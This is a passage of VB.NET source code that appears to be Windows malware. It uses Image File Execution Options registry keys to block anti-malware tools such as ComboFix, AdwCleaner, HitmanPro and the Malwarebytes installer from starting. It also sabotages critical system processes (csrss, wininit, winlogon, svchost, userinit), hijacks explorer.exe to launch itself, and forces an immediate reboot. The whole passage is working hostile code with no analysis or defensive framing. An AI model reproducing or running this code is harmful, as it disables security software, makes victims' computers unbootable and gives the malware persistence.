        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ComboFix.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti14()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mb3-setup-1878.1878-3.3.1.2183.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mb3-setup-1878.1878-3.3.1.2183.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti15()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AdwCleaner.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AdwCleaner.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti16()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HitmanPro.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HitmanPro.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti17()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HitmanPro_x64.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HitmanPro_x64.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub Explorer()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", True)
        key.SetValue("Debugger", Application.ExecutablePath)
    End Sub
    Public Sub Csrss()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub Wininit()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub Userinit()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\userinit.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\userinit.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub Svchost()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub Winlogon()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe", True)
        key.SetValue("Debugger", "RIP")
        System.Diagnostics.Process.Start("shutdown", "-r -t 00 -f")
    End Sub
End Module
